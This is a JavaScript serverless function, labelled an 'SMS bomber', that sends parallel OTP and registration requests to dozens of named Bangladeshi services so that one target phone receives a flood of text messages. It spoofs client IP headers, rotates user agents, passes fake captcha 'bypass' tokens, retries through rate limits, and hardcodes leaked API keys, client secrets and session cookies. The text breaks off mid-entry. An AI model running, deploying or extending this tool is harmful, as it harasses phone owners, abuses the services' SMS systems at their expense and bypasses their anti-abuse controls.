// ╔══════════════════════════════════════════════════════════╗
// ║   SMS BOMBER API — Vercel Serverless Function            ║
// ║   Converted from Rust/WASM Cloudflare Worker            ║
// ║   All APIs, retry logic, parallel fire — preserved      ║
// ╚══════════════════════════════════════════════════════════╝

// ══════════════════════════════════════════════════════
//  🚫 BLOCKED NUMBERS
// ══════════════════════════════════════════════════════
const BLOCKED_NUMBERS = [
  "01890183516",
  "01893336440",
  "01516511889",
  "01905040150",
];

// ══════════════════════════════════════════════════════
//  🔄 USER-AGENT POOL
// ══════════════════════════════════════════════════════
const USER_AGENTS = [
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; TECNO CK7n Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/148.0.7778.120 Mobile Safari/537.36",
  "okhttp/4.12.0", "okhttp/4.11.0", "okhttp/4.9.3", "okhttp/3.14.9",
  "Dart/3.2 (dart:io)", "Dart/2.19 (dart:io)", "Dart/2.14 (dart:io)",
  "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230805.001)",
  "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)",
];

const ACCEPT_LANGS = [
  "en-US,en;q=0.9", "en-GB,en;q=0.9",
  "en-US,en;q=0.9,bn;q=0.8", "bn-BD,bn;q=0.9,en;q=0.8", "en;q=0.9,bn;q=0.8",
];

const FAKE_IPS = [
  "59.152.4.182","103.48.196.14","202.134.8.11","118.179.211.54","103.231.184.32",
  "43.245.8.192","116.193.180.7","119.40.82.116","182.160.110.48","103.15.250.19",
  "103.75.246.8","27.147.173.22","103.69.126.91","180.148.28.6","36.255.68.14",
  "103.111.204.55","103.56.207.12","103.4.93.188","45.115.104.30","103.7.28.14",
  "103.7.28.56","202.78.172.4","202.78.172.100","59.152.4.50","203.76.48.10",
  "203.76.48.50","203.76.48.100",
];

const REFERERS = [
  "https://www.google.com/", "https://www.google.com.bd/",
  "https://www.facebook.com/", "https://m.facebook.com/",
  "https://www.bing.com/", "", "",
];

const DEVICE_IDS = [
  "45098c95a7fe4109cc5969a770ee846a",
  "48b1f7061f48c950090220f62128b2c3",
  "5f545c10-e594-11f0-8299-fdfde03856d4",
  "a1b2c3d4e5f67890", "b5f0985eb84c4bfa",
  "88c7743e-d714-4735-ad05-339e43cf8e73",
];

const FIREBASE_TOKENS = [
  "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI",
];

// ══════════════════════════════════════════════════════
//  UTILS
// ══════════════════════════════════════════════════════
function pseudoRand(seed) {
  let x = BigInt(seed) ^ 0x9e3779b97f4a7c15n;
  x = (x ^ (x >> 30n)) * 0xbf58476d1ce4e5b9n;
  x = (x ^ (x >> 27n)) * 0x94d049bb133111ebn;
  return Number((x ^ (x >> 31n)) & 0xFFFFFFFFFFFFFFFFn);
}

function pick(arr, seed) {
  return arr[Math.abs(pseudoRand(seed)) % arr.length];
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function urlEncode(obj) {
  return Object.entries(obj)
    .map(([k, v]) => {
      const val = (v === null || v === undefined) ? '' :
        (typeof v === 'object' ? JSON.stringify(v) : String(v));
      return encodeURIComponent(k) + '=' + encodeURIComponent(val);
    })
    .join('&');
}

// ══════════════════════════════════════════════════════
//  FIRE ONCE — single HTTP attempt (Node.js fetch / https)
// ══════════════════════════════════════════════════════
async function fireOnce(name, url, bodyStr, hdrs, isPost, seed, timeoutMs) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  // Build headers
  const headers = {};
  const provided = {};
  for (const [k, v] of hdrs) {
    headers[k] = v;
    provided[k.toLowerCase()] = true;
  }

  if (!provided['user-agent'])      headers['User-Agent']       = pick(USER_AGENTS, seed);
  if (!provided['content-type'])    headers['Content-Type']     = 'application/json';
  if (!provided['accept'])          headers['Accept']           = 'application/json, text/plain, */*';
  if (!provided['accept-language']) headers['Accept-Language']  = pick(ACCEPT_LANGS, seed + 2);
  if (!provided['x-forwarded-for']) headers['X-Forwarded-For']  = pick(FAKE_IPS, seed + 3);
  headers['X-Real-IP']       = pick(FAKE_IPS, seed + 7);
  headers['Cache-Control']   = 'no-cache';
  headers['Pragma']          = 'no-cache';
  headers['Accept-Encoding'] = 'gzip, deflate, br';

  if (!provided['referer']) {
    const rf = pick(REFERERS, seed + 4);
    if (rf) headers['Referer'] = rf;
  }

  try {
    const options = {
      method:  isPost ? 'POST' : 'GET',
      headers,
      signal:  controller.signal,
    };
    if (isPost && bodyStr) options.body = bodyStr;

    const res  = await fetch(url, options);
    const s    = res.status;
    const ok   = [200, 201, 202, 204].includes(s);
    const text = await res.text().catch(() => '');
    const preview = text.slice(0, 150);

    clearTimeout(timer);
    return { api: name, status: s, ok, body: preview };

  } catch (e) {
    clearTimeout(timer);
    const isTimeout = e.name === 'AbortError' || e.message?.includes('abort');
    return { api: name, status: 0, ok: false, err: isTimeout ? 'timeout' : e.message };
  }
}

// ══════════════════════════════════════════════════════
//  FIRE CORE — build body + smart retry
// ══════════════════════════════════════════════════════
async function fireCore(name, url, payload, hdrs, isPost = true, timeoutMs = 14000) {
  const ct = hdrs.find(([k]) => k.toLowerCase() === 'content-type')?.[1] ?? 'application/json';
  const bodyStr = ct.includes('x-www-form-urlencoded')
    ? urlEncode(payload)
    : JSON.stringify(payload);

  // Seed from name
  let baseSeed = 0x517cc1b727220a95;
  for (let i = 0; i < name.length; i++) {
    baseSeed = (baseSeed + name.charCodeAt(i) * (i + 1)) >>> 0;
  }

  for (let attempt = 0; attempt < 3; attempt++) {
    const seed = Math.abs(pseudoRand(baseSeed + attempt));
    const r    = await fireOnce(name, url, bodyStr, hdrs, isPost, seed, timeoutMs);
    const { ok, status } = r;

    if (ok) return r;

    // Hard failures — no retry
    if ([401, 404, 405, 410, 451].includes(status)) return r;

    // 403 — rotate UA, retry
    if (status === 403 && attempt < 2) {
      await sleep(500);
      continue;
    }

    // Rate limited
    if (status === 429) {
      await sleep(attempt === 0 ? 1500 : 3000);
      continue;
    }

    // 400 — check if OTP was still sent
    if (status === 400) {
      const body = r.body ?? '';
      if (/otp|OTP|sent|success|SMS|mobile|code|verify/i.test(body)) {
        return { ...r, ok: true, note: '400 with OTP trigger' };
      }
      if (attempt < 2) { await sleep(400); continue; }
      return r;
    }

    // Timeout / server errors
    if ([0, 500, 502, 503, 504].includes(status) && attempt < 2) {
      await sleep(800);
      continue;
    }

    if (attempt === 2) return r;
  }

  return { api: name, status: 0, ok: false, err: 'all attempts failed' };
}

function fire(name, url, payload, hdrs) {
  return fireCore(name, url, payload, hdrs, true, 14000);
}

// ══════════════════════════════════════════════════════
//  ALL API CALLS — parallel
// ══════════════════════════════════════════════════════
function buildApiCalls(number, bdNo, bdFull, plusBd, plusBdFull, deviceId, firebase) {
  return [

    fire("Shadhin Music",
      "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
      { msisdn: bdFull, shortcode: 16235, servicename: "Shadhin Music" },
      [["Content-Type","application/json"],["Origin","https://shadhinmusic.com"],["Referer","https://shadhinmusic.com/"]]
    ),

    fire("Chorki",
      "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
      { number: plusBd },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://www.chorki.com"],["Referer","https://www.chorki.com/"],["Accept","application/json"],["x-requested-with","XMLHttpRequest"]]
    ),

    fire("Chorki Android",
      "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=android&language=en",
      { number: plusBdFull },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://www.chorki.com"],["Referer","https://www.chorki.com/"],["Accept","application/json"]]
    ),

    fire("Bioscope Live",
      "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
      { number: plusBdFull },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://www.bioscopeplus.com"],["Referer","https://www.bioscopeplus.com/"],["Accept","application/json"],["authorization",""],["x-requested-with","mark.via.gp"]]
    ),

    fire("Pickaboo",
      "https://www.pickaboo.com/rest/default/V1/customer-check/exist",
      { mobile: number },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://www.pickaboo.com"],["Referer","https://www.pickaboo.com/"],["Accept","application/json, text/plain, */*"],["x-requested-with","mark.via.gp"]]
    ),

    fire("Shwapno",
      "https://www.shwapno.com/api/auth",
      { phoneNumber: number },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://www.shwapno.com"],["Referer","https://www.shwapno.com/"],["x-requested-with","XMLHttpRequest"]]
    ),

    fireCore("Rokomari",
      `https://www.rokomari.com/otp/send?emailOrPhone=${bdFull}&countryCode=BD`,
      {},
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://www.rokomari.com"],["Referer","https://www.rokomari.com/login"],["x-requested-with","XMLHttpRequest"]],
      true, 14000
    ),

    fire("Sindabad",
      "https://m2ce.sindabad.com/rest/V1/EasyLogin/isMobileAvailable",
      { websiteId: 1.0, customerMobile: number },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://www.sindabad.com"],["Referer","https://www.sindabad.com/"],["x-requested-with","XMLHttpRequest"]]
    ),

    fire("Kirei BD",
      "https://frontendapi.kireibd.com/api/v2/send-login-otp",
      { email: number },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://kireibd.com"],["Referer","https://kireibd.com/"],["Accept","application/json, text/plain, */*"],["x-requested-with","XMLHttpRequest"]]
    ),

    fire("Easy BD",
      "https://core.easy.com.bd/api/v1/registration",
      { password: "123456", password_confirmation: "123456", device_key: deviceId, name: "Team Dangerous", mobile: number, social_login_id: "", email: "dangerousboytushar@gmail.com" },
      [["Content-Type","application/json; charset=utf-8"],["Host","core.easy.com.bd"],["lang","en"],["device-key",deviceId],["Origin","https://easy.com.bd"],["Referer","https://easy.com.bd/"],["Accept","application/json, text/plain, */*"],["x-requested-with","mark.via.gp"]]
    ),

    fire("Easy BD Reg",
      "https://core.easy.com.bd/api/v1/registration",
      { password: "Tushar@2021", password_confirmation: "Tushar@2021", device_key: "45098c95a7fe4109cc5969a770ee846a", name: "Rahat Ahmed", mobile: number, social_login_id: "", email: "rahat@example.com" },
      [["Content-Type","application/json; charset=utf-8"],["Host","core.easy.com.bd"],["lang","en"],["device-key","45098c95a7fe4109cc5969a770ee846a"],["Origin","https://easy.com.bd"],["Referer","https://easy.com.bd/"],["x-requested-with","mark.via.gp"]]
    ),

    fire("Le Reve Craze",
      "https://www.lerevecraze.com/login/verify_phone",
      { mobile_no: number, resend: "0", recaptcha_token: "bypass" },
      [["Content-Type","application/x-www-form-urlencoded"],["Origin","https://www.lerevecraze.com"],["Referer","https://www.lerevecraze.com/login/"],["Accept","application/json, text/javascript, */*; q=0.01"],["x-requested-with","XMLHttpRequest"]]
    ),

    fire("Focallure BD",
      "https://store.focallurebd.com/api/v1/1/ecom/auth/getCode",
      { mobile: number },
      [["Content-Type","application/json"],["user-agent","Dart/2.14 (dart:io)"],["Origin","https://store.focallurebd.com"]]
    ),

    fire("Bata BD",
      "https://www.batabd.com/apps/ez/api/GenerateOtp",
      { MobileNo: bdNo, EmailId: "team@dangerous.com", StoreName: "batabd.myshopify.com", IP: "59.152.4.182", Token: "bypass_token", CountryCode: "880" },
      [["Content-Type","application/x-www-form-urlencoded"],["Origin","https://www.batabd.com"],["Referer","https://www.batabd.com/account/register"],["Accept","application/json, text/javascript, */*; q=0.01"],["x-requested-with","XMLHttpRequest"]]
    ),

    fire("Khaodao",
      "https://api.eat-z.com/auth/customer/app-connect",
      { username: plusBd },
      [["host","api.eat-z.com"],["x-eatz-apiclient","ANDROID"],["accept","application/json"],["content-type","application/json; charset=UTF-8"]]
    ),

    fire("Quality Foods",
      "https://admin.qualityfoods.com.bd/api/auth/check-phone",
      { phone: number, is_sign_in: 0, login_type: "phone" },
      [["Content-Type","application/json"],["Origin","https://qualityfoods.com.bd"]]
    ),

    fire("Upay",
      "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
      { wallet_number: number, geo_location: { lat: 23.8979093, long: 89.1356346 }, referral: "", firebase_token: firebase, device_uuid: deviceId, mno: "Robi" },
      [["Content-Type","application/json"]]
    ),

    fire("Fundesh OTP",
      "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
      { msisdn: bdNo },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://fundesh.com.bd"],["Referer","https://fundesh.com.bd/fundesh/profile"],["x-requested-with","mark.via.gp"],["User-Agent","Mozilla/5.0 (Linux; Android 14; TECNO CK7n Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/148.0.7778.120 Mobile Safari/537.36"]]
    ),

    fire("Fundesh Resend",
      "https://fundesh.com.bd/api/auth/resendOTP",
      { msisdn: number },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://fundesh.com.bd"],["Referer","https://fundesh.com.bd/"],["x-requested-with","XMLHttpRequest"]]
    ),

    fire("Shikho OTP",
      "https://api.shikho.com/public/activity/otp",
      { phone: number, intent: "ap-discount-request" },
      [["Content-Type","application/json"],["Accept","application/json"],["Build-Version","(450) 4.5.0"],["Origin","https://shikho.com"],["Referer","https://shikho.com/"]]
    ),

    fire("Shikho SMS",
      "https://api.shikho.com/auth/v2/send/sms",
      { auth_type: "signup", phone: bdFull, vendor: "shikho", type: "student" },
      [["Content-Type","application/json; charset=utf-8"],["Accept","application/json, text/plain, */*"],["Origin","https://shikho.com"],["Referer","https://shikho.com/"],["x-requested-with","mark.via.gp"],["User-Agent","Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"]]
    ),

    fire("Bohubrihi",
      "https://bb-api.bohubrihi.com/public/activity/otp",
      { phone: number, intent: "login" },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://bohubrihi.com"],["Referer","https://bohubrihi.com/"],["x-requested-with","XMLHttpRequest"]]
    ),

    fire("Mojaru",
      "https://new.mojaru.com/api/student/login",
      { mobile_or_email: number },
      [["Content-Type","application/x-www-form-urlencoded"]]
    ),

    fire("Ghoori Learning",
      "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
      { mobile_no: number },
      [["Content-Type","application/json"],["Host","api.ghoorilearning.com"],["Referer","https://ghoorilearning.com/"],["Origin","https://ghoorilearning.com"]]
    ),

    fire("English Moja",
      "https://api.englishmojabd.com/api/v1/auth/login",
      { phone: plusBd },
      [["Content-Type","application/json"],["User-Agent","Dart/3.2 (dart:io)"],["Origin","https://englishmojabd.com"]]
    ),

    fire("Practice Club",
      "https://www.practiceclub.net/api/register",
      { contact_no: number },
      [["Content-Type","application/json"],["User-Agent","okhttp/4.9.0"],["Origin","https://www.practiceclub.net"]]
    ),

    fire("ACS Future School",
      "https://auth.acsfutureschool.com/api/v1/otp/send",
      { phone: number },
      [["Content-Type","application/json"],["Origin","https://acsfutureschool.com"]]
    ),

    fire("Training Gov BD",
      "https://training.gov.bd/backoffice/api/user/sendOtp",
      { mobile: number },
      [["Content-Type","application/json"],["Origin","https://training.gov.bd"]]
    ),

    fire("Quizgiri",
      "https://developer.quizgiri.xyz/api/v2.0/send-otp",
      { country_code: "+88", phone: number },
      [["Content-Type","application/json"],["x-api-key","gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G"],["User-Agent","Dart/2.12 (dart:io)"],["Origin","https://quizgiri.xyz"]]
    ),

    fire("Sundarban Courier",
      "https://api-gateway.sundarbancourierltd.com/graphql",
      { operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: number } }, query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n    message\n    statusCode\n    result {\n      phone\n      otpCounter\n      __typename\n    }\n    __typename\n  }\n}" },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://customer.sundarbancourierltd.com"],["Referer","https://customer.sundarbancourierltd.com/"],["authorization",""],["x-requested-with","mark.via.gp"],["User-Agent","Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"]]
    ),

    fire("Garibook",
      "https://api.garibookadmin.com/api/v4/user/login",
      { recaptcha_token: "garibookcaptcha", mobile: plusBd, channel: "web" },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://garibook.com"],["Referer","https://garibook.com/"],["Accept","application/json"],["x-requested-with","mark.via.gp"]]
    ),

    fire("Apex4u",
      "https://api.apex4u.com/api/auth/login",
      { phoneNumber: number },
      [["Content-Type","application/json; charset=utf-8"],["Referer","https://apex4u.com/"],["Origin","https://apex4u.com"],["Accept","application/json, text/plain, */*"],["x-requested-with","mark.via.gp"]]
    ),

    fire("Nexo Pet",
      "https://host03pet.nexopet.com/api/v1.0/users/send-otp",
      { phone: number },
      [["Content-Type","application/json"],["Origin","https://www.nexopet.com"]]
    ),

    fire("AWS POC",
      "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
      { phone: number },
      [["Content-Type","application/json"]]
    ),

    fire("Deepto Play",
      "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
      { number: plusBd },
      [["Content-Type","application/json; charset=utf-8"],["Host","api.deeptoplay.com"],["Origin","https://www.deeptoplay.com"],["Referer","https://www.deeptoplay.com/"],["Accept","application/json"],["x-requested-with","XMLHttpRequest"],["authorization",""]]
    ),

    fire("Chaldal",
      "https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey",
      { phoneNumber: plusBdFull, retryAttempt: 0 },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://chaldal.com"],["Referer","https://chaldal.com/"],["Accept","application/json"],["x-egg-storeid","1"],["x-egg-clientapp","Omelette"],["x-egg-platform","Browser"],["x-requested-with","mark.via.gp"],["User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"]]
    ),

    fire("Khaas Food",
      "https://www.khaasfood.com/api/auth/request-otp",
      { username: number },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://www.khaasfood.com"],["Referer","https://www.khaasfood.com/"],["Accept","application/json"],["x-requested-with","mark.via.gp"],["User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"],["cache-control","no-cache"],["pragma","no-cache"]]
    ),

    fire("Walton Plaza",
      "https://waltonplaza.com.bd/api/auth/otp/create",
      { auth: { countryCode: "880", deviceUuid: "5f545c10-e594-11f0-8299-fdfde03856d4", phone: bdNo, type: "LOGIN" }, captchaToken: "no recapcha" },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://waltonplaza.com.bd"],["Referer","https://waltonplaza.com.bd/"],["x-requested-with","XMLHttpRequest"],["User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"]]
    ),

    fire("Munchies BD",
      "https://api.munchies.com.bd/parse/functions/generateOtp",
      { phone: number },
      [["Content-Type","application/json; charset=utf-8"],["X-Parse-Application-Id","munchiesbd"],["X-Parse-REST-API-Key","munchiesbd"],["X-Parse-Client-Version","js2.12.0"],["X-Parse-Installation-Id","f47ac10b-58cc-4372-a567-0e02b2c3d479"],["Origin","https://munchies.com.bd"],["Referer","https://munchies.com.bd/"]]
    ),

    fire("Meena Bazar",
      "https://meenabazardev.com/api/mobile/front/send/otp",
      { CellPhone: number, type: "login" },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://meenabazardev.com"],["Referer","https://meenabazardev.com/"],["Accept","application/json, text/plain, */*"]]
    ),

    fire("Paymaster BD",
      "https://ap.paymasterbd.net/login_registration/",
      { phone_number: number, fcm_key: "", device_id: "b5f0985eb84c4bfa", sms_hash_code: "s2//QkN6BpW" },
      [["Content-Type","application/x-www-form-urlencoded"],["User-Agent","okhttp/3.14.9"],["Accept","application/json"],["Accept-Language","en-US,en;q=0.9"]]
    ),

    fire("QPay BD",
      "https://identity01.qpaybd.com.bd/api/v1/verification/phone",
      { Id: number },
      [["Content-Type","application/json"],["User-Agent","Dart/3.2 (dart:io)"],["Accept","application/json"],["Accept-Language","en-US,en;q=0.9"]]
    ),

    fire("Dutch Bangla NX",
      "https://nxpay1.dutchbanglabank.com/user/register",
      { aspId: "5678", locale: "EN", msisdn: bdFull, registrationUserId: bdFull, tcidList: [50], telcoId: "GP" },
      [["Content-Type","application/json"],["X-KM-User-AspId","5678"],["X-KM-Accept-language","en"],["X-KM-OS-SERVICE-TYPE","GMS"],["X-KM-User-Agent","ANDROID/100046615"],["Host","nxpay1.dutchbanglabank.com"],["User-Agent","okhttp/4.9.3"]]
    ),

    fire("FSIB Freedom",
      "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber",
      { AccessToken: "", TrackingNo: "", mobileNo: number, otpSms: "", product_id: "131", requestChannel: "MOB", trackingStatus: 5 },
      [["Content-Type","application/json"],["User-Agent","okhttp/4.10.0"],["Accept","application/json"],["Accept-Language","en-US,en;q=0.9"]]
    ),

    fire("Ghoori Learning Login",
      "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&intent=login",
      { mobile_no: number, intent: "login" },
      [["Content-Type","application/json"],["Host","api.ghoorilearning.com"],["Referer","https://ghoorilearning.com/"],["Origin","https://ghoorilearning.com"]]
    ),

    fire("iEducation BD",
      "https://www.ieducationbd.com/api/account/check_user",
      { mobile: number },
      [["Content-Type","application/json"],["Origin","https://www.ieducationbd.com"],["Referer","https://www.ieducationbd.com/"],["Accept","application/json, text/plain, */*"],["User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"]]
    ),

    fire("RedX OTP",
      "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
      { phoneNumber: number },
      [["Content-Type","application/json"],["Origin","https://redx.com.bd"],["Referer","https://redx.com.bd/"],["app-agent","merchant-web/1.0"],["Accept","application/json, text/plain, */*"],["x-requested-with","mark.via.gp"]]
    ),

    fire("RedX Login",
      "https://api.redx.com.bd/v1/user/request-login-code",
      { callingCode: "+880", phoneNumber: bdNo, countryCode: "BD", service: "redx" },
      [["Content-Type","application/json; charset=utf-8"],["Origin","https://redx.com.bd"],["Referer","https://redx.com.bd/"],["Accept","application/json, text/plain, */*"],["x-requested-with","mark.via.gp"],["app-agent","rider-web/1.0"]]
    ),

    fire("Porter BD",
      "https://customerapp-gateway-ktor.prod.porter.ae/onboarding/customer/signup",
      { phone: number },
      [["content-type","application/json"],["country","bd"],["preferred-languages","{\"app_language\":\"en\"}"],["brand","porter"],["source","android"],["version-name","6.7.0"],["custom-app-version-code","410"],["client-request-uuid","88c7743e-d714-4735-ad05-339e43cf8e73"],["installation-id","0eb9e8bc-9725-4bd5-a382-fe92c716b3c7"],["app-session-id","4699341c-6f94-4481-af99-041b43d24623"],["user-agent","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230805.001)"],["accept","application/json"],["accept-language","en-US,en;q=0.9"]]
    ),

    fire("Gorilla Move",
      "https://api.gorillamove.com/api/v1/core/account/phone_login",
      { phone_number: number, step: 1 },
      [["Content-Type","application/json"],["Origin","https://www.gorillamove.com"],["Referer","https://www.gorillamove.com/"],["Accept","application/json, text/plain, */*"],["User-Agent","Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"]]
    ),

    fire("Otithee",
      "https://gateway.otithee.com/api/v1/generate-otp",
      { request_type: "registration", mobile_number: number },
      [["Content-Type","application/json"],["Accept","application/json, text/plain, */*"],["Origin","https://otithee.com"],["User-Agent","Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"]]
    ),

    fire("Relaxy BD",
      "https://dev.api.relaxy.com.bd/api/v1/otp/send",
      { phoneNumber: plusBdFull, appSignature: "appSignature" },
      [["Content-Type","application/json"],["User-Agent","Dart/2.19 (dart:io)"],["x-api-key","6yjOGvakSbHjA64NGqo7m25TBC4WX8BauAXEP3dX"],["Accept","application/json"]]
    ),

    fire("BD Matrimony",
      "https://www.bangladeshimatrimony.com/register/editmobileno.php",
      { mobileNo: number },
      [["Content-Type","application/x-www-form-urlencoded"],["Origin","https://www.bangladeshimatrimony.com"],["Referer","https://www.bangladeshimatrimony.com/"],["Accept","application/json, text/javascript, */*; q=0.01"],["x-requested-with","XMLHttpRequest"]]
    ),

    fire("MyGuardian BD",
      "https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp",
      { mobileNumber: number, type: null },
      [["Content-Type","application/json"],["Accept","application/json, text/plain, */*"],["Origin","https://myguardianbd.com"],["User-Agent","okhttp/4.9.3"]]
    ),

    fire("NRB Bazaar",
      "https://www.nrbbazaar.com/Customer/RequestOtpForRegistration",
      { phoneNumber: number, email: "example@gmail.com", "__RequestVerificationToken": "CfDJ8OTdK55f1KtKpMVto1XODz36P2tWXfyeot9aYuxWqkd81qABD_JFUva73ce2L5ftYmqCgwInZKUHisKU3mWb6DkYgBFDg4QIej8YwHP3BQ3fQvgBfc6mbMjVua7p-AT4MEPtgYhLexJmTxl7enCosqA" },
      [["Content-Type","application/x-www-form-urlencoded"],["Origin","https://www.nrbbazaar.com"],["Referer","https://www.nrbbazaar.com/"],["Accept","application/json, text/javascript, */*; q=0.01"],["x-requested-with","XMLHttpRequest"],["Cookie",".Nop.Antiforgery=CfDJ8N5UM1Mg0_JFs4qu7TCIBSzGu689vm8mbvSPQ743hQSg8CQN0NF_XzfjEsi78OgkEPagdV_jE0-Bv17i3ToM1axTnWqbYcicXyGSwLVIJt-Jpak2l8yoNfuDZsgWG4Hlg4xPW4OOpCtcsf5xmMkdvFk"]]
    ),

    fire("Medico Bio",
      "https://api.v2.medico.bio/patient/passwordless-login",
      { phoneNumber: number, deviceId: deviceId, channel: "web", userType: "patient", type: "newUser" },
      [["Content-Type","application/json"],["Origin","https://medico.bio"],["Referer","https://medico.bio/"],["Accept","application/json, text/plain, */*"]]
    ),

    fire("Amiprobashi",
      "https://www.amiprobashi.com/api/v7/en/auth/send-otp",
      { device_type: "1", username: plusBd, for: "1", type: "1", bd_number: "1" },
      [["content-type","application/x-www-form-urlencoded"],["android-app-version","4.5.0"],["user-agent","okhttp/4.10.0"],["Accept","application/json"]]
    ),

    fire("Bepari App",
      "https://api.bepari.app/bestfreshfarm/api/V1.4/access-control/user/registerOtp",
      { client_id: 4, client_secret: "zCzOixaOJ4JywQr1VsowGZhCaEbZ49WLxweNBgPK", mobile_no: number },
      [["Content-Type","application/json"],["Origin","https://www.bestfreshfarm.com"],["Referer","https://www.bestfreshfarm.com/"],["Accept","application/json, text/plain, */*"]]
    ),

    fire("Hishabee",
      "https://distribution.hishabee.business/api/app/v1/auth/number-check",
      { mobile_number: number },
      [["Content-Type","application/json"],["Accept","application/json, text/plain, */*"],["User-Agent","okhttp/4.9.3"]]
    ),

    fire("ILYN Global",
      "https://api.ilyn.global/auth/signup",
      { phone: { code: "BD", number: number }, provider: "sms" },
      [["Content-Type","application/json"],["Accept","application/json, text/plain, */*"],["Origin","https://ilyn.global"],["User-Agent","Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"]]
    ),

    fire("Klassy BD",
      "https://api.klassy.com.bd/api/v2/public/user/register/send/otp",
      { phone: number },
      [["Content-Type","application/json"],["Accept","application/json, text/plain, */*"],["Origin","https://klassy.com.bd"],["User-Agent","okhttp/4.9.3"]]
    ),

    fire("One Fish",
      "https://api.onefish.app/api/auth/user/sendotp",
      { phone: number },
      [["Content-Type","application/json"],["Accept","application/json, text/plain, */*"],["User-Agent","Dart/3.2 (dart:io)"]]
    ),

    fire("Rangs Motors",
      "https://api.rangsmotors.com/",
      { u_num: number },
